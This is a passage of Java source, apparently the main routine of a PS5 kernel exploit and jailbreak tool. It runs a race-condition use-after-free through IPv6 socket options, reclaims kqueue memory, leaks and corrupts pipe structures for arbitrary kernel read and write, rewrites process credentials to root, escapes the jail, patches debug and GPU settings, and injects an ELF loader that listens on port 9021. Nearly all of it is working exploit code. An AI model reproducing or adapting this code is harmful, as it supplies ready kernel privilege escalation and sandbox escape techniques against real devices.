            }

            Status.println("[+] Syscalls ready. Preparing Stage 0...");

            pinThread();

            setupSlowRW();
            Status.println("[+] SlowRW threads started. Ready to steal pointers...");
            
            int[] masterPipes = createPipePair();
            int[] victimPipes = createPipePair();
            masterRfd = masterPipes[0]; masterWfd = masterPipes[1];
            victimRfd = victimPipes[0]; victimWfd = victimPipes[1];

            for (int i = 0; i < 64; i++) {
                int fd = (int) api.call(sys_socket, AF_INET6, SOCK_STREAM, 0L);
                if (fd < 0) break;
                ipv6_sockets[i] = fd;
                ipv6_count = i + 1;
            }
            Status.println("[+] IPv6 Sockets created: ".concat(String.valueOf(ipv6_count)));

            for (int i = 0; i < ipv6_count; i++) {
                api.call(sys_setsockopt, ipv6_sockets[i], IPPROTO_IPV6, 51L, 0L, 0L);
            }
            ksleep(500);

            Buffer leakRthdr = new Buffer(UCRED_SIZE);
            for (int i = 0; i < UCRED_SIZE / 8; i++) {
                leakRthdr.putLong(i * 8, RTHDR_TAG | i);
            }
            
            Buffer tagBuf = new Buffer(16);
            Buffer tagLen = new Buffer(4);
            
            Status.println("[*] STAGE 0 COMPLETED. Starting Stage 1 (UAF)...");
            
            boolean raceSuccess = false;
            for (int attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                Status.println(" |-> Attempt ".concat(String.valueOf(attempt)).concat("/8..."));
                if (attemptRace(leakRthdr, tagBuf, tagLen)) {
                    raceSuccess = true;
                    Status.println("[+] SUCCESS! Triplets found.");
                    break;
                }
                ksleep(10);
            }

            if (!raceSuccess) {
                Status.println("[!] The race failed. Reboot the console and try again.");
                return;
            }

            Status.println("[+] Stage 1 completed. Preparing Stage 2 (Kqueue reclaim)...");
            
            long procFileDesc = reclaimKqueue(leakRthdr, tagBuf, tagLen);
            if (procFileDesc == 0) {
                Status.println("[!] Stage 2 failed. Reboot the console.");
                return;
            }
            
            Status.println("[+] Stage 2 completed. Ready for Stage 3 (Leak Pipe Pointers).");
            Status.println("[*] Stealing master pipe pointers...");
            
            long fdOfiles = 0;
            long masterFp = 0;
            long victimFp = 0;
            long masterPipeData = 0;
            long victimPipeData = 0;

            long fdescenttbl = kslow64(procFileDesc + FILEDESC_OFILES, leakRthdr, tagBuf, tagLen);
            
            if (fdescenttbl == 0 || (fdescenttbl >>> 48) != 0xFFFF) {
                Status.println("[!] ERROR: fdescenttbl invalid (0x".concat(Long.toHexString(fdescenttbl)).concat(")"));
                Status.println("[!] Aborting to avoid KP.");
                return;
            }

            fdOfiles = fdescenttbl + FDESCENTTBL_HDR;
            Status.println("[+] fdOfiles leak: 0x".concat(Long.toHexString(fdOfiles)));
            ksleep(200);

            for (int r = 0; r < 6; r++) {
                if (masterFp == 0) masterFp = kslow64(fdOfiles + (masterRfd * FILEDESCENT_SIZE), leakRthdr, tagBuf, tagLen);
                if (masterFp != 0 && masterPipeData == 0) masterPipeData = kslow64(masterFp, leakRthdr, tagBuf, tagLen);

                if (victimFp == 0) victimFp = kslow64(fdOfiles + (victimRfd * FILEDESCENT_SIZE), leakRthdr, tagBuf, tagLen);
                if (victimFp != 0 && victimPipeData == 0) victimPipeData = kslow64(victimFp, leakRthdr, tagBuf, tagLen);

                if (masterPipeData != 0 && victimPipeData != 0) break; 
                
                Status.println(" |-> Incomplete pointers, retrying...");
                ksleep(200);
            }

            if (masterPipeData == 0 || (masterPipeData >>> 48) != 0xFFFF || victimPipeData == 0 || (victimPipeData >>> 48) != 0xFFFF) {
                Status.println("[!] ERROR: Invalid pipe pointers. Aborting Stage 3.");
                if (uafSocket >= 0 && fdOfiles != 0) {
                    Buffer zero = new Buffer(8); zero.putLong(0, 0);
                    kwriteSlow(fdOfiles + (uafSocket * FILEDESCENT_SIZE), zero, 8);
                }
                return;
            }

            Status.println("[+] master_pipe = 0x".concat(Long.toHexString(masterPipeData)));
            Status.println("[+] victim_pipe = 0x".concat(Long.toHexString(victimPipeData)));
            
            Status.println("[*] Starting Stage 3: Corrupting Master pipe...");
            Buffer pipeOverwrite = new Buffer(24);
            pipeOverwrite.putInt(0, 0); 
            pipeOverwrite.putInt(4, 0); 
            pipeOverwrite.putInt(8, 0); 
            pipeOverwrite.putInt(12, 0x4000); 
            pipeOverwrite.putLong(16, victimPipeData); 

            boolean corruptOk = false;
            int rthdrSize = buildRthdr(leakRthdr, UCRED_SIZE);
            
            for (int attempt = 0; attempt < 10; attempt++) {
                if (triplets[0] >= 0 && triplets[1] >= 0 && triplets[2] >= 0) {
                    if (kwriteSlow(masterPipeData, pipeOverwrite, 24)) {
                        corruptOk = true;
                        break;
                    }
                }
                
                Status.println(" |-> ERROR kwriteSlow, fixing memory (Attempt ".concat(String.valueOf(attempt + 1)).concat("/10)..."));
                api.call(sys_sched_yield);

                triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
                if (triplets[1] != -1) {
                    triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, leakRthdr, rthdrSize, tagBuf, tagLen);
                }
                ksleep(20);
            }

            if (!corruptOk) {
                Status.println("[!] Fatal failure in Stage 3 (kwriteSlow failed).");
                if (uafSocket >= 0 && fdOfiles != 0) {
                    Buffer zero = new Buffer(8);
                    zero.putLong(0, 0);
                    kwriteSlow(fdOfiles + (uafSocket * FILEDESCENT_SIZE), zero, 8);
                    Status.println("[*] Emergency cleanup applied.");
                }
                return;
            }

            long testVerify = kslow64(masterPipeData + 0x10, leakRthdr, tagBuf, tagLen);
            if (testVerify != victimPipeData) {
                Status.println("[!] Verification failure. Corruption was not applied.");
                if (uafSocket >= 0 && fdOfiles != 0) {
                    Buffer zero = new Buffer(8);
                    zero.putLong(0, 0);
                    kwriteSlow(fdOfiles + (uafSocket * FILEDESCENT_SIZE), zero, 8);
                }
                return;
            }

            Status.println("=========================================");
            Status.println("[+] FULL KERNEL CONTROL ACHIEVED!");
            Status.println("=========================================");

            Status.println("[*] Starting Stage 4: Searching for curproc and rootvnode...");
            int[] sigioPipes = createPipePair();
            int sigioRfd = sigioPipes[0];
            
            int ourPid = (int) api.call(sys_getpid);
            Buffer pidBuf = new Buffer(4);
            pidBuf.putInt(0, ourPid);
            api.call(sys_ioctl, sigioRfd, 0x8004667CL, pidBuf.address()); 

            long sigioFp = kread64(fdOfiles + sigioRfd * FILEDESCENT_SIZE);
            long sigioPipe = kread64(sigioFp);
            long pipeSigio = kread64(sigioPipe + PIPE_SIGIO);
            long curproc = kread64(pipeSigio);
            int verifyPid = kread32(curproc + PROC_PID);
            
            if (verifyPid != ourPid) {
                Status.println("[!] PID mismatch. Incorrect curproc.");
                return;
            }
            
            long procUcred = kread64(curproc + PROC_UCRED);
            long procFd = kread64(curproc + PROC_FD);
            Status.println("[+] curproc = 0x".concat(Long.toHexString(curproc)));

            long initProc = 0;
            long p = curproc;
            for (int i = 0; i < 500; i++) {
                if (p == 0 || (p >>> 48) != 0xFFFF) break;
                if (kread32(p + PROC_PID) == 1) { initProc = p; break; }
                p = kread64(p);
            }
            
            if (initProc == 0) {
                p = kread64(curproc + 0x08);
                for (int i = 0; i < 500; i++) {
                    if (p == 0 || (p >>> 48) != 0xFFFF) break;
                    if (kread32(p + PROC_PID) == 1) { initProc = p; break; }
                    p = kread64(p + 0x08);
                }
            }

            if (initProc == 0) {
                Status.println("[!] init process not found.");
                return;
            }
            
            long initFd = kread64(initProc + PROC_FD);
            long rootvnode = kread64(initFd + FD_RDIR);
            Status.println("[+] rootvnode = 0x".concat(Long.toHexString(rootvnode)));

            Status.println("[*] Starting Stage 5: Jailbreak (Patching credentials)...");
            
            kwrite32(procUcred + UCRED_CR_UID, 0);
            kwrite32(procUcred + UCRED_CR_RUID, 0);
            kwrite32(procUcred + UCRED_CR_SVUID, 0);
            kwrite32(procUcred + UCRED_CR_NGROUPS, 1);
            kwrite32(procUcred + UCRED_CR_RGID, 0);

            long attrsQword = kread64(procUcred + 0x80);
            attrsQword = (attrsQword & 0xFFFFFFFF00FFFFFFL) | (0x80L << 24);
            kwrite64(procUcred + 0x80, attrsQword);

            kwrite64(procFd + FD_RDIR, rootvnode);
            kwrite64(procFd + FD_JDIR, rootvnode);

            long initUcred = kread64(initProc + PROC_UCRED);
            long prison0 = kread64(initUcred + UCRED_CR_PRISON);
            kwrite64(procUcred + UCRED_CR_PRISON, prison0);

            long SYSTEM_AUTHID = 0x4800000000010003L;
            kwrite64(procUcred + UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            kwrite64(procUcred + UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFL);
            kwrite64(procUcred + UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFL);

            int verifyUid = kread32(procUcred + UCRED_CR_UID);
            if (verifyUid == 0) {
                Status.println("=========================================");
                Status.println("[+] JAILBREAK SUCCESSFULLY COMPLETED! You are ROOT.");
                Status.println("=========================================");

                cleanupExploit(fdOfiles);

            } else {
                Status.println("[!] Failed to apply Jailbreak. UID: ".concat(String.valueOf(verifyUid)));
            }
            
            // --- STAGE 6 & 7 START ---
            Status.println("[*] Starting Stage 6: Configuring GPU DMA...");
            
            dataBase = findDataBase(curproc); 
            if (dataBase == 0) {
                Status.println("[!] FATAL ERROR: The database returned 0. Preventing kernel crash.");
                return;
            }
            
            long targetProc = findNativeProcess();
            
            if (targetProc != 0) {
                Status.println("[*] Swapping sysent to configure GPU...");
                long[] savedSysent = swapSysent(sysentOff, curproc, targetProc);
                
                if (GPU.setup(curproc)) {
                    Status.println("[+] GPU Setup completed. Applying Debug patches...");
                    GPU.patchDebug();
                    Status.println("[+] Debug patches applied! QA Flags activated.");
                } else {
                    Status.println("[!] Failed to configure GPU.");
                }
                restoreSysent(savedSysent);

                // --- STAGE 7: ELF LOADER ---
                Status.println("[*] Starting Stage 7: Injecting ELF Loader...");
                ElfLoader.load(curproc, fdOfiles, sysentOff, targetProc, realFw);

            } else {
                Status.println("[!] Could not find native process. GPU and ELF will fail.");
            }

            // --- FINAL STABILIZATION ---
            Status.println("=========================================");
            Status.println("[+] ALL STAGES COMPLETED SUCCESSFULLY");
            Status.println("[+] Debug Settings visible");
            Status.println("[+] Port 9021 is OPEN and listening");
            // Status.println("[+] You can now close the app!");
            Status.println("[i] Made by: @Jaime_Cyber on Twitter");
            Status.println("=========================================");

            Status.println("[+] PS5 autoloader starting...");
            sendElf("/ps5_autoload.elf");
            Status.println("[+] Closing disc player...");
            sendElf("/ps5_killdiscplayer.elf");

        } catch (Exception e) {
            Status.printStackTrace("[!] Fatal error in exploit", e);
        }
    }    
}